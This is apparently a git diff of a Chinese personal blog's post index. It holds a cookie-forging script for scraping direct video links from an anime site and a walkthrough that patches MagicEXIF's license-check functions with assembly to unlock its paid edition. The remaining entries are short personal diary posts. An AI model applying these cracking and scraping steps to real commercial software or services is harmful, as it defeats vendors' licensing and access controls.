+t1 = int(re.compile(r"t1=[^;]*;").search(setcookies).group()[3:-1:])
+print(t1)
+cookies = getcookie(t1)
+cookies["t1"] = str(t1)
+data = requests.get(url,headers=&#123;"referer":"https://www.agefans.cc/",&#125;,cookies=cookies)
+print(data.text)
+
+成功获得直链~
+&lt;Response [200]&gt;
+t1&#x3D;1634231445902; Path&#x3D;&#x2F;, k1&#x3D;586623324; Path&#x3D;&#x2F;
+1634231445902
+t1 is 1634231445902, now is 1634231395254, t1-time_now &#x3D; 50648
+k2&#x3D;99036993616128
+t2&#x3D;1634231395258
+
+	&#123;
+		&quot;purl&quot;:&quot;&#x2F;age&#x2F;player&#x2F;ckx1&#x2F;?url&#x3D;&quot;,
+		&quot;purlf&quot;:&quot;https:&#x2F;&#x2F;play.agefans.cc:8443&#x2F;age&#x2F;player&#x2F;dpx&#x2F;?url&#x3D;&quot;,
+		&quot;vurl&quot;:&quot;https%3a%2f%2fkol%2dfans%2efp%2eps%2enetease%2ecom%2ffile%2f6159a40954eace75cb975131raYEy7we03?from%3Dysjdm.com%7Cysjdm.net&quot;,
+		&quot;playid&quot;:&quot;&lt;play&gt;web_mp4&lt;&#x2F;play&gt;&quot;,
+		&quot;vurl_bak&quot;:&quot;&quot;,
+		&quot;purl_mp4&quot;:&quot;&#x2F;age&#x2F;player&#x2F;ckx1&#x2F;?url&#x3D;&quot;,
+		&quot;ex&quot;:&quot;&quot;
+	&#125;
+
+
+碎碎念整这么麻烦干什么。
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>javascript</tag>
+        <tag>reverse</tag>
+        <tag>anime</tag>
+        <tag>encryption</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MagicEXIF破解思路之VB程序破解</title>
+    <url>/articles/ctf/cracking-magicexif/</url>
+    <content><![CDATA[从0开始的VB程序破解上周，为了整点乐子，我打算寻找一个简单的软件来进行破解。正好某群友有一个需要破解的应用，于是这个应用就不幸的成为了我的目标。
+开始之前先来介绍一下这个程序，MagicEXIF一个非常强大的图片元数据编辑器。 分为免费版，专业版，旗舰版。 
+安装完程序后，先来看看程序的基本信息
+
+
+
+一个使用Visual Basic编写的程序，且是32位的应用。 再来看看BinaryNinja的反编译结果。
+我的评价是惨不忍睹，各种变量混在一起使用，字符串甚至是直接存在函数体里面的，只能说挺离谱的。
+
+总的来说，直接看反编译的代码难度较大，不是很好整。 我又尝试了IDA，结果也是一样。
+所以我得找点别的方法
+简单进行了一下google，发现VB的程序实际上是运行在一个类似VB虚拟机上的程序。 
+简单来说，VB程序可以大致分为两个部分，一个为窗体部分，一个为代码部分。窗体部分主要负责软件界面的大致框架，代码部分则是由Pcode组成的一个个函数。 窗体部分通过调用不同的函数来实现不同的效果。
+网上正好有一个decompiler可以反编译VB程序 (VB Decompiler)，我把软件本体和decompiler都拖到沙箱里开始分析。
+程序分析打开VB Decompiler, 把fast decompile的勾给去掉，等待反编译完成。
+可以看到注册的功能是在窗体frmRegister下的
+
+在code段找到对应的代码，一个个点进去进行分析，我们可以得到用户名的长度必须大于8，注册码的长度为64。（因为只有这样激活按钮才可以被按）
+
+继续看激活的过程，具体代码位于cmdActivate_click中，可以发现一旦激活成功后，软件会将激活信息明文储存在reg_info.cfg文件里，这个文件包含用户名，注册码，以及注册模式。注册模式这个之后会说。
+
+观察软件对全局变量的修改与读取，我们同样可以知道0x68002c储存了软件的版本信息（即未注册，专业，旗舰）。 在BN里查找code reference之后，我们也可以推断出每个版本对应的数值。
+0x87 &#x3D; 旗舰版
+0x63 &#x3D; 专业版
+0x1 &#x3D; 免费版
+
+
+激活完成后，程序会跳出一个窗口让用户重启，在这里可以合理推断验证注册码的代码会在程序启动的时候运行。
+因为注册信息保存在reg_info.cfg里，这就给了我一个很好的突破口，查找哪些函数使用了reg_info.cfg这个字符串。于是我们就可以顺藤摸瓜找到对应的函数0x573BD0。
+ 
+可以看到软件先在软件的安装目录下加载了reg_info.cfg文件，并读取了保存的激活信息
+从中我们也可以在发现几个重要的全局变量，0x680034保存了用户名(UserName)，0x680038保存了注册码(ActivationCode)，0x680032保存了激活模式(RegMode)。
+再来看具体的注册码验证部分，简单概括一下逻辑
+如果注册模式(RegMode为1),那么会调用第一个验证函数0x56e360检查注册码，如果注册模式为0，那么则会调用第二个验证函数0x56e9b0。
+ 
+这两个验证函数都会返回一个值，这个值会赋值给0x68002c也就是软件版本。
+同时，这两个函数也会设置0x680030的值。 查看这个的值的cross reference，我们可以知道这个值代表了授权模式。 
+0 永久授权
+1 企业永久授权
+2 个人授权（时间有限）
+
+ 
+这也是为什么在注册码验证的那部分里，如果这个值是2(也就是不是永久验证)，他会去检查到期时间来确保验证码没有过期。
+破解了解了程序具体的具体验证思路，那么就可以进行破解了。
+破解的思路比较粗暴，直接给那两个验证函数(0x56e360,0x56e9b0)打补丁，让那两个返回我们要的版本号，设置授权模式为我们想要的模式即可
+; 设置为旗舰版（实际上没用这个代码没用
+mov word [0x68002c], 0x87 
+; 设置为企业永久激活
+mov word [0x680030], 1
+; 设置返回值为旗舰版
+xor eax,eax
+mov eax, 0x87
+ret
+
+ 
+然后在程序目录下新建注册信息 reg_info.cfg
+填入注册信息即可
+ 
+效果 
+未解决的问题如果我们再次用cross reference查找哪些地方调用注册码验证函数，我们发现了一个类似初始化函数的代码。
+ 
+如图所示，我们可以发现他一共调用了两次验证函数，第一次使用arg3=0，第二次使用arg3=-1。
+奇怪的是，不管第一次的reg mode是啥，第二次都会变成0，运行一次第二个验证函数。 所以实际上只要给第二个验证函数打补丁就可以了。
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>crack</tag>
+        <tag>reverse</tag>
+        <tag>visual basic</tag>
       </tags>
   </entry>
   <entry>
@@ -9117,19 +8840,6 @@ put some chatgpt generated text for conclusion
       </tags>
   </entry>
   <entry>
-    <title>why pixilation a text is bad</title>
-    <url>/articles/ctf/why-pixilation-is-bad/</url>
-    <content><![CDATA[todo.
-check out https://bishopfox.com/blog/unredacter-tool-never-pixelation
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>微信视频号视频加密逆向</title>
     <url>/articles/ctf/wechat-video-encryption-reverse-engineer/</url>
     <content><![CDATA[前言大家好啊，我又回来写博客了。由于大四的选了几门超级难的课，导致没多少时间写博客了。（以上50%为真）
@@ -9267,6 +8977,19 @@ wasm_video_decode_fallback.js v1.2.46
       </tags>
   </entry>
   <entry>
+    <title>why pixilation a text is bad</title>
+    <url>/articles/ctf/why-pixilation-is-bad/</url>
+    <content><![CDATA[todo.
+check out https://bishopfox.com/blog/unredacter-tool-never-pixelation
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Writable memory section before init and after init</title>
     <url>/articles/ctf/writable-memory-section-before-init-and-after-init/</url>
     <content><![CDATA[0x0 DifferentThe memory mapping is little differnt
@@ -9324,6 +9047,18 @@ However, after finish the init and enter main. this page should no longer be mod
       <tags>
         <tag>linux</tag>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 2023 10 01</title>
+    <url>/articles/diary/diary20231001/</url>
+    <content><![CDATA[撐不下了去
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
       </tags>
   </entry>
   <entry>
@@ -10096,72 +9831,251 @@ https://nodejs.org/en/docs/guides/debugging-getting-started/
       </tags>
   </entry>
   <entry>
-    <title>[小说简评] 宇宙飞行手册 (前115章)</title>
-    <url>/articles/novel/yu-zhou-fei-xing-shou-ce-qian-115-zhang-jian-ping/</url>
-    <content><![CDATA[《宇宙飞行手册》前115章简评
-这本书连载于起点中文网，目前尚未完结。
-阅读感受包括剧透，但不包括剧情和任务的介绍。如果还未读过这本书，建议先阅读再参考此评价。
-前言在朋友Y的推荐下阅读了这本书，朋友Y的推荐语是：“如果你觉得前三章好看，那么你一定会喜欢这本书。”
-我认为这话既对，又不尽然。
-
-
-Section A不同于起点所谓的“黄金三章”，期望从第一章开始就吸引读者，这本书的前几章完全没有任何抓人眼球的剧情。相反，它的开头就像一个史诗故事的旁白，平淡却不乏吸引力。作者以相亲为切入点，短短几章便清晰而详细地描绘了一个星际大航海世界观的一角。
-当然，该作品也有精彩之处。无论是王平安和安格丽首次搭档任务时的救人行动，还是第105章中的“爆破”企业号，这些故事单独拿出来都足以让人热血沸腾。尤其是在有前文铺垫的情况下，更加引人入胜。
-因此，在剧情方面，这本书的前105章毫无疑问是完美的。
-Section B剧情出色的同时，我们也能感受到作者在角色塑造上的用心。正因为有了丰满的角色形象，这些角色所参与的戏码才如此吸引人，打动人。
-可以看出，作者花了大量篇幅描绘一个角色，即使这个角色只是众多配角中的一个（卢盈盈）。在描写卢盈盈时，无论是从主角的视角，还是从卢盈盈的家庭、朋友的角度，作者都从多个方面展示了这个角色。我们能清晰地感受到这个角色的性格和内心活动，所以当这个角色在剧情中做出某些行动时，我们会觉得：啊，她就是这样一个人。
-对于主角更不用多说。
-Section C写这篇文章时，我刚读完第115章。但我可能不太想继续看下去了。我的直觉（以及其他原因）告诉我，这本书注定是一个悲情的Bad Ending（让我想起了《边缘行者》）。虽然这个Bad End可能会很精彩，但我年纪大了看不了悲剧(笑。
-当我读到第115章卢盈盈的角色和朋友表露心声时，我便能隐约感觉到，这本书不太可能有一个美好的结局。
-一个完整的故事由许多小故事组成，而这些小故事中，除了主角之外，还会有一个小故事的主角。这个小故事的主线通常围绕着这个小故事主角和真主角展开。
-每个故事都会有结局，小故事也不例外。无论这个小故事的主角最后是加入主角团继续冒险，还是在一旁做自己的事情，总会有一个小结局来描绘这个小故事的主角。
-在我读过的绝大部分作品中，小故事的结局或多或少都暗示了全文的走向。
-在第115章，卢盈盈这个小故事告一段落了：
--卢盈盈有一个梦想，就是和主角王平安简简单单谈恋爱、结婚、共度一生。可惜作为主角的王平安并不愿意，他的目标是星辰大海，于是主角踏上了最前线。
-卢盈盈为了主角，放弃了原本安稳的工作，毅然决然地加入了慰问团，为的就是能到前线去和主角见面，为的就是能追随主角的脚步。
-可惜，卢盈盈永远追不上主角，她只是在追寻一个可能并不存在的幻影罢了。-
-相对的，主角也有一个梦想，就是前往半人马星座。当我读到这里时，我几乎已经能猜到后续剧情：在主角追求前往半人马星座的途中，他不断被各种麻烦事缠身，最后死在各个势力的混战中。
-（当然这有点草率了，作者肯定有更好的方式让主角走向结局）
-以上只是一个原因。
-另一个原因是基于我对作者心思的揣摩——能写出这种开头的人，真的会为了取悦读者而写一个大团圆结局吗？ 
-这个故事就是套了一个喜剧外表的悲剧故事。 基本上所有的角色都是悲剧角色：
-王平安的生母去世，生父换了多个妻子；安格丽的原生家庭为了入籍把女儿当商品；喜欢星空的兄妹因为各种阴谋丧命；
-类似的例子还有很多。
-想想就是了，有什么能让一个故事更加深入人心，更加震撼人心？我想，除了悲剧之外，别无他法。
-Section D再来谈谈作者，这位作者完全不像一位网络文学作家，甚至可以说他不适合作为一个网络文学作者。在这个时代，网络文学作者或多或少都会为读者做一些妥协，而这位作者却是完完全全按照自己的想法在写，全身心投入。而不妥协的网络文学作者基本上不会有很好的成绩，因为他吸引的终究是那么一小部分和他能共鸣的人。
-这有好处也有坏处。坏处在于，这本书只能与那些与作者电波相符的人对话。如果没有匹配上，那么读者会觉得作者就是一团糟，作者也会觉得读者就是一团糟。
-但问题在于，有些故事对不上电波的人也会觉得很精彩，这就导致部分读者可能会觉得书的上下文割裂感有点大。
-总之，对于网络文学来说，这本书的作者似乎有中二病发作，有点太沉浸在自己创造的世界里了（不过这也是角色刻画和剧情表现能够引人入胜的原因吧，笑）。
-结语为了讲述Section CD，写了AB。
-希望之后能狠狠地打我的脸。
-Aynakeya
-2023.04.27
+    <title>[日记] 2023 12 10</title>
+    <url>/articles/diary/diary20231210/</url>
+    <content><![CDATA[昨天有个人，一个应该忘掉我的人，给我祝了生日快乐。我破防了。
+怎么说呢，感觉像个孤独患者在那里自我拉扯。
+我也不知道为啥，我从小就能很清楚的感受他人的情绪，不论是从表情上还是从言语上，他人的情绪对我仿佛就是没有那个掩饰一般。喜，怒，哀，乐。任何情绪，我都能如切身的体会到一般感受到他人的情绪。我甚至能一定的从情绪中感受到一部分他人的真实想法。
+他人即地狱，我处理不来这种事情。这些事情对于我来说一种巨大的压力，我一度无法处理这种麻烦而陷入自闭。而现在这种自闭的时间越來越长也越來难以调节了。
+总之，因为这个特质，我有时候会过于注重自己的言行对于他人的感受，我一直小心翼翼的活着深怕自己对他人造成什么影响。我一直想修正这个问题，我尝试过很多办法，有些没用，有些开始有用，但随着时间的推移效果越来越弱。我只能强硬的把自己的内心隐藏起来，把自己感性的一面深深的藏起来，用完全理性的态度来生活。
+为了压制住内心的情感，防止自己的言行对他人造成麻烦。我试图给自己的带上一个个面具，面对不同的人，都用着不同的面具。祈求于这种方式能够至少在表面上维护与建立起我正常的社交关系。
+这种方式很不讲道理，但是很有效。谁能想到脸部红心不跳的说出的话语实际上是谎言呢。我知道欺骗别人是不好的，但是让别人不要让别人麻烦或许对于我而言更为重要，所以对此，我与愿意去欺骗他人。
+也许是面具带的多了，我开始丧失了表达自己内心真实情感想法的能力，我害怕自己真实的情感会造成他人的不适，会让别人对我另有看法。我也害怕这幅面具消逝之后，其他人是否能够接受真实的自己。
+我知道这些都是些老生畅谈的问题了，也许对于整个社会来说，这个问题就是常见的，小小的事情。但对于我来说就是隔在我与现实社会的一道墙，一个屏幕。我害怕去推开他，我也不愿去推开他。
+可惜这个方法也快要失效了，虽然我依旧能够扮演出我想要的那个角色，内心里却有一种无法控制的力量想要把这个面具撕毁，撤碎。我害怕，非常害怕表达出真实的情感，害怕隐藏在一个个面具后的我被揭露出来。所以我开始自闭，试图远离一切人际交流关系，试图把自己和整个人际关系分割开来。
+但是，为什么呢，这究竟是为什么呢。明明已经习惯了这么多年来一个人孤独的活着，不把自己的内心展现给他人。我明明刻意的隐藏自己的生日，刻意的不和任何人提起自己的生日，甚至试图让自己忘掉我还有生日这件事情。
+明明我不想有人给我发，但是我就是控制不住的破防了。明明我知道对于她来说，就是突然记起来的随手一发，我还是像一个在阴湿角落祈求光明的可怜虫，故作无意的问她为什么突然发这个。
+真是好笑
 ]]></content>
       <categories>
-        <category>Novel</category>
+        <category>Diary</category>
       </categories>
       <tags>
-        <tag>书评</tag>
+        <tag>日记</tag>
       </tags>
   </entry>
   <entry>
-    <title>[小说简评] 小世界其乐无穷 - 听日</title>
-    <url>/articles/novel/xiao-shuo-shu-ping-xiao-shi-jie-qi-le-wu-qiong/</url>
-    <content><![CDATA[最近在看一本十分有趣的书《术士手册》，作者是听日的。总的来说，就是脑洞很大，其中每个人物都有属于他自己的特色。
-但是这本书还没有完结，就不多评价了。
-因为这本书的原因，又去找了找作者的其他书看了一看。于是就有了今天的书评。
-《小世界其乐无穷》的剧情设定来说就是一个宅男收到了一个游戏机，他在里面通关的任何游戏都可以在不久后化成现实。基于这个设定，作者给出了居多的脑洞，而且每个都非常有意思。
-从最开始的编排与主角无关人物，到后来主角成为游戏里的角色之一并开始亲手缔造未来，每一场游戏，以及游戏和现实的交汇都非常好看。确实能看出作者在脑洞这一方面的天赋。
-但是，仅限前半本书。到后半本书之后（从颠倒世界开始），虽然游戏的部分依旧可以。但是这b作者开始写感情线了，还是写4个的后宫，你有这个能力么。
-这突然转进的感情戏导致这本书前后的观感差距很大，有很大的割裂感。就前半部分好好的在说游戏，但是从颠倒世界这一卷开始就一转感情线，中间没有任何的转折，没有过渡，就突然开始谈恋爱了，而且还是走后宫那一派的。
-其他的就不多说了。
-2022.08.16Aynakeya
+    <title>[日记] 2023 12 09</title>
+    <url>/articles/diary/diary20231209/</url>
+    <content><![CDATA[祝我生日快乐
 ]]></content>
       <categories>
-        <category>Novel</category>
+        <category>Diary</category>
       </categories>
       <tags>
-        <tag>书评</tag>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 2024 01 03 night</title>
+    <url>/articles/diary/diary20240103-2/</url>
+    <content><![CDATA[怎么说呢，我从小到大就是一个没有什么主见的人。也不是没有什么主见吧，可能更准确的说法是我好像一直是为他人而活着的。就说小学的时候，我当时啥也不知道也不记得什么事情了，只要是我认为我做的事会让父母开心，那我会去做。不管是上什么乱七八糟的兴趣班，还是努力拿个啥子的学习小能手。
+而在初中的那段时间，我生活的动力就完全为了我喜欢的女生。
+我是在一个当地的重点初中上的学，父母给我选择这所学校的主要原因还是因为我的身体。我一直患有过敏性鼻炎，就是对尘螨，花粉一类的东西过敏。而且一直治不好。所以家里给我选了一个周围环境较好的初中读书，希望鼻炎不要那么严重。
+我在初中的成绩一直不错，虽然拿不到班级前五，但是中上游还是有的。主要原因还是偏科偏的有点厉害，经常是数学科学能拿95,96，但要说起文科，那就是一塌糊涂了。英语政治这些还行，靠记忆还能勉强混个85左右。语文就是纯纯的在70分上下徘徊了，阅读理解实在是做不明白。（都是100分制）
+我的同桌在数学这方面就有点不是很好了。或许一开始是我看不下去她弄不明白某道题目，我就开始教她怎么做题。一来二去的我们两个也就熟了起来。我给他讲讲题，她也会借她的语文作业给我参考。
+后来不知道从哪天起，我发现我有点离不开她了，每天上学的动力就是去见她。学习的目标也从让家里人开心变成了如何学的明白点，然后狠狠的辅导她的功课。 &#x2F;&#x2F; 怎么说呢，感觉有点扭曲了。
+总之不管怎么说，她的数学也的确慢慢的好起来了，甚至在几场小考中比我考的都高。
+这样的关系即使我们两个不是同桌之后依然存在，直到初三上学期。
+本来我的目标就是单纯的去中考考个好高中，或者走提前招生想办法进个重点高中，如果能把她也给拐到同一所高中最好。嘛，即使不是同一所高中，至少是在同一所城市嘛。
+但因为我的鼻炎实在是好不了而且有愈发严重的趋势，我父母打算把我直接丢到国外去读书，毕竟相比较当时的国内空气质量来说，国外的空气质量确实要好不少。
+那我当时是坚决不同意啊，我初三还没上完呢，我还想和她多见几面，怎么可以现在就润。总之几番拉扯之下，也是我当时不够坚定的原因，最终我爸妈决定先让我在国内找一个国际学校读一读，然后大学再去国外上。
+这个时候先插入一个设定，我初中的时候有课间餐这东西存在，就是每天的第n节课后（n是几忘了），负责送货的人会把蛋糕啥的丢教室门口，然后大伙一下课一拥而上去恰蛋糕。
+在这两年，她的那份都是我出去拿然后给她带进来了。ok 设定结束
+我和她说了这事，说我爸妈感觉想送我到国际学校读书。她当时也没什么特别反应，就回了句 &quot;国际学校啊，那也挺好的&quot;，然后也没有后续了。
+大约是初三上中旬的某一天，我一如往常的帮她拿了蛋糕。她没有像往常一样接过，而是有点认真的给我说，“X, 以后不用帮我拿了” (X &#x3D; 我的全名)。
+我当时有点蒙，反正下意识的就点了点头说行吧。
+从那以后，我俩的交集就慢慢的变少了。
+之后的日子我反正就是浑浑噩噩的度过，也没啥可说的了。总之结果就是我顺利考进了那所国际学校，她进了一所本地的普高。
+我已经分不太清这是梦还是真实发生的事情，我记得我有一天在qq上问她你喜欢过我么。
+“真的要说么？” 她说，“应该是喜欢过的吧”
+反正我当时不知道脑子抽了还是怎么回事，就回了句“那就这样吧”，就结束话题了。
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 2024 01 03</title>
+    <url>/articles/diary/diary20240103/</url>
+    <content><![CDATA[怎么说呢，现在这个世界上真的好事没多少，坏事一件比一件多。那作为一个普通人，光是看到这些坏事就已经很无奈，很气愤了。要是一不小心代入了，直接能给我气到昏迷。
+但是除了愤慨好像也啥事都做不了，就好似那个生气的河豚，给自己涨得圆滚滚的。却不知在人看是如此的可笑。
+这时候就有人要说了，你觉得不好你就去改变它，你觉得不行你就去建设他。你不发动自己的主观能动性在这边说说有啥用处呢。说到底还是自己不够努力，改变不了，嘻嘻。
+还真是，我就是废物。我没办法改变世界，甚至没办法改变他人，我唯一能够改变的就是自己。我唯一能做的就是让我至少在未来碰到这类事情的时候，我不会做出是他人受到伤害的决定。
+除此之外，我们什么都改变不了。
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[日记] 2024 01 04</title>
+    <url>/articles/diary/diary20240104/</url>
+    <content><![CDATA[draft
+来讲讲我在国内读国际高中的事情。可能有些吧友对国际高中有点误解，认为里面都是群天天嗯开party的富家子弟。怎么说呢，这得看学校，也得看人。
+首先是我读的那所国际高中，还是以升学率为目标的，也就是最后申请季的学生申请情况。所以老师也是相对严格一点，当然还是比不上国内普通高中的，毕竟能来上学的都是有点米的学生，自然也会有点闹腾的心。
+&#x2F;&#x2F; 当然也有些打着“国际高中”，实际则为贵族学校的的高中，那个也许比较接近大伙的想象，但是我没去过我也不知道。
+当然也得分人，大体可以分为两批人，一批想要申请顶尖大学的卷王，当然也有一批只有有学读就可以的。
+再来说说课程，可能相比国内高中的深，我读的国际学校可能相对而言不是很深，但是比较宽。因为是在国内读的，我们必须在同时通过所有学考的情况下（关系到拿到高中毕业证），然后读一些大学课程 &#x2F;&#x2F; 我读的是AP
+比如微积分啊，统计，大学化学，Java, 量子力学之类的东西。哦还有天杀的SAT和TOEFL
+ok设定介绍完成
+因为是国际学校，我们能掌控的自由相对而言还是比较多的。就比如，能带电脑上学。 &#x2F;&#x2F; 因为电脑要用于上课
+鼠鼠因为失去了生活的目标，寻思着找个事情逃避现实，于是鼠鼠就开始自学编程，然后整天像个nerd一样对着计算机屏幕疯狂输出。
+总之就是题目不会做了，生活中遇到烦心事了，ok，直接两而不闻窗外事，然后隔那恩敲代码，管他什么作业ddl，先等我写完代码再说。
+当然副作用也是有的，鼠鼠的编程技能从0开始一路起飞，写了不少项目，包括博客啊啥的。甚至有一个小软件一度到达过用户量200+的成绩。
+所以，理所应当的，鼠鼠把编程当初自己唯一的依靠，毕竟只有在这里，鼠鼠才能找到属于自己的存在感。
+当然在高二开始申请大学的时候，我也是一门心思的往计算机比较好的大学申请。可惜由于当时情况特殊，美国的大学基本都把我给拒绝了（头铁直接嗯申计算机）。
+最后还是加拿大的一所学校给了我offer。&#x2F;&#x2F; 别开我盒
+然后鼠鼠就去了。
+ok扯远了，下面正式进入留学生活。
+由于毕业那年正好碰上疫情，给封在家里出不去了，鼠鼠又不想浪费一年时间搞那啥gap year，纯纯的浪费时间。
+于是鼠鼠就开始日夜颠倒的上网课了，简单来说就是白天睡觉，晚上上课。
+ok 第二年，鼠鼠就独自踏上了前往加麻大的留学生活。
+怎么说呢，只能说空气相比国内确实要好很多，鼠鼠的鼻炎到这儿后就没有复发过了。
+大二那年，鼠鼠和同学一起租了一个大house。当然不值鼠鼠一个人。房东把一整个别墅分成了好几个房间，分别租给不同的人，有点像群租房那种。算一算，那个大house里，地下一层住了五个人，第一层住了4个人，第二层住了4个，加起来十多个人。不过至少每个人都有单独的房间就是了。
+当然租客也不止国人，也有本地人，当然也有印度人。
+说说第一印象吧，当时那个印度租客怎么说呢，就是一股子咖喱味，又有点臭臭的，不是太好评价。然后他做菜做的确实是一拖糊糊，比如他有个常备的粉碎机，做菜时先把番茄啊，鸡蛋啊，黄油啊啥的，不管三七二十一先放进粉碎机里打碎，然后倒到锅里煮，煮完就嗯造。
+然后本地人的印象就挺正常的了，有逆天的，也有非常正常好相处的人。
+比如住在二楼的一个白人，姑且称呼为A。比较逆天的是他用锅做完菜之后从来都不洗。
+我记得有一次A拿平底锅隔拿嗯煎鸡腿，重点是那个鸡腿还没有化冻，煎完之后他也不管熟没熟，直接就开始啃。啃完之后把锅一扔就不管它了。
+到了第二天，他又下来做饭了，这次他拿着没洗过的锅，直接开始煎鸡蛋，我当时大为震撼。
+说实在的，来加麻大前就知道这地方抽w33d的人挺多。但我确实没想到会这么多，有时候你走在路上，要是突然闻到一股令人恶心的臭味，那个就是有人刚刚飞过了。
+再来说说治安，治安这东西，得看地区，最乱的地方就是市中心。白天倒是挺正常的，除了可以随时见到流浪汉之外也没啥好说的。
+但是到了晚上，那就是整一个群魔乱舞。鼠鼠有一次和同学去市中心吃自助，吃完有点晚了。出来的第一感觉就是，我去好浓的w33d味，直接给我恶心坏了。
+在走向公交车站的路上，随地可以看见周围吸嗨了的人，正在交易的流浪汉，还有拿着拐杖当长枪乱挥的，给我和同学看的一愣一愣的。
+最离谱的时候，在路上突然窜出一个流浪汉，一边直接上手来扯我同学的外套，一边用及其诡异的姿势问我同学，“你这夹克衫哪里来的？”。
+我和同学两大男人直接给吓傻了，我直接回了句“我们不说英文”，然后拉着我同学就一路跑到公交车站。直到上车才缓过气来。
+以后我们就决定晚上再也不去downtown了，真的太危险了。
+至于我们住的房子，还有学校，这个就属于“郊区了”，平常人都看不见一个，更别说流浪汉了。还是相对来说比较安全的，不过有了这次的经历，我俩晚上就再也没出去过。
+]]></content>
+      <categories>
+        <category>Diary</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>日记 20240206</title>
+    <url>/articles/diary/diary20240204/</url>
+    <content><![CDATA[五分真五分假，看个乐子
+我小学开始，我就时不时的会被“鬼压床”，我不太好说这到底是不是鬼压床，因为他和平常大家描述的鬼压床不太一样。
+而且每次出现的都是同一个效果。而且分阶段
+这个“鬼压床”每次都发现在睡觉前。
+第一阶段
+在快要睡着的时候，身子会突然从后背开始发麻，然后逐渐蔓延到全身，接着四肢就动不了，即使意识非常清醒。后来，当这个征兆出现的时候，我就很明确清楚的意识到这事又来了，但是我没办法反抗，只能被拖入第二阶段。
+第二阶段
+紧接着，我耳朵会出现那种呓语。我不太好描述这个呓语，真要说可能是克苏卢那种不可名状，不可描述的感觉。感觉是一种带着有点疯狂的嘻笑，声音会逐渐增大直到充斥我整个脑海。同时会有一种无法用语言描述的恐惧感出现在心里。
+第三阶段
+等到那股笑声到达巅峰的时候，我感觉身下会出现一个黑洞一样的漩涡，会渐渐开始有一股力量撕扯着我把我往下拉。往下，往下一直往下。
+每次出现这种情况的时候，我都会在疯狂的试图呼吸，说话，和睁开眼睛。然后，我也每次都能在第二阶段，或者第三阶段挣扎出来。
+在我小学的时候，这种现象一般是一个月会出现1到二次。到了初中的时候，频率逐渐加多。到高一快结束的时候到达巅峰。那段时间，甚至是一周出现2,3次。有时甚至能连着出现两三天。
+我也给我家里说过，带我看了医生也看不出个所以然，就说可能是身体比较虚吧。
+总之，这样的现象，一直持续到那件事发生后，从那以后，我就再也没有遇到过相同的鬼压床了
+大概是高一的下半学期。那天，因为我和家里大吵了一架，具体原因大概是考试没考好。我本就挺难受的，家里还要说我，我就挺难受的。总之一直吵到睡觉前，我父母还在那边唠叨。
+那天好巧不巧，相同的鬼压床有出现了。与之前不同的是，这次我没有任何的反抗，想着要是这样意识消失了也不错，至少不需要在被学习什么烦恼了。
+于是，我没有任何反抗的，被那个漩涡吸入。接着，我就失去意识了。
+第二天，我正常的醒来。感觉似乎似乎一切都没有任何变化。似乎缺了什么，但我又说不出来。
+当天在学校里，我一改往日行为，变得有点沉默寡言了。我同学都有点奇怪，为啥我突然不活跃了。我也不知道，只说被训了一顿，心情不太好。不过同学也都了解我，一般这种事我第二天醒来就忘记了。他们就当我遇到了别的什么事情，也没有多问&#x2F;
+直到放学回家，我打开平板看点视频，动漫啥的。知道我打开一个视频，就是类似那种消防员冲进火场救人，狗狗救主人的那种类似的感人小视频的时候。
+我突然意识到，我并不是心情不太好，而是我失去感情了。
+这是一种很奇怪的感觉，我知道感情是什么，我甚至知道某些时刻我应该有什么感情，但是我就是感受不到任何感情。
+任何喜怒哀乐，对于我来说仿佛就是一个概念，我知道它，我了解它。但是我和他就仿佛隔着一层玻璃，我碰不到她们。
+我一部特别喜欢的动漫plastic memory（可塑性记忆），我刷了好几遍，里面很多情节我机会每一次刷都能有点那种泪目的感觉。
+但是，当我再次重复观看这部动漫的时候，当我再次看到那些情节的时候，我很明确的意识到，我这里应该会被感动。但是我就是没有丝毫的情绪，非常奇怪。
+说实话，这个虽然一开始对我有点影响，但是我很快就适应了。因为即使我感受不到情绪，但是我依旧知道某个时候应该有什么情绪，从而表演出来。
+或许是有人从我这边取走了什么，同时也我留下了一点什么东西。我甚至不知道这两件事有没有关联。
+我发现自己有了一点特殊的能力。我也不知道这到底是真的还是单纯是某些心理学现象。
+就是，我会时不时的能感受到“神启”，我不太好描述这是一种什么能力。
+我最早意识到我有这种能力，是在发生这件事之后的第三天，当时我和同学正偷偷用大屏幕看nba篮球直播。看着看着，我突然鬼使神差来了一句，“下一球，xxx会进三分。”我也不知道我为什么说出这句话，完全是我在无意识的情况下说出来的。紧接着，大约半分钟后，xxx果然进了三分。
+我同学当时很惊讶，我也有点惊讶，但是更多的是一种“就是应该这样”的感觉。
+这样的事情，在我失去感情之后就经常出现了。
+这个能力，完全就是属于被动触发，触发条件是啥我完全不知道。但是发动的时候，我会完全不由自主的无意识的说出一句话，或者一段话。
+这一段话，基本会在接下来的半小时内以某种方式实现，或者印证。
+就在去年10月份的时候吧，我和同学在打英雄联盟。当时我和同学走下路。我在和同学一句一句有聊没聊的。
+我印象非常深，我们刚刚和打野三包二把下路越了正在吃镀层，这个时候，对面重担在中路，打野和对面上路在打虫子。理论上没有任何人威胁到我们。
+正吃着的时候，我也不知道我为什么，突然就说了一句“别死”。 我同学正疑惑呢，问我：“什么别死，对面人都不在我怎么死”
+这个时候我不知道为什么，我大脑一片空白，跟卡壳了一样。我在没有意识的情况下，似乎是以非常扭曲的声音喊了一声（据我同学描述）
+“姐姐？”
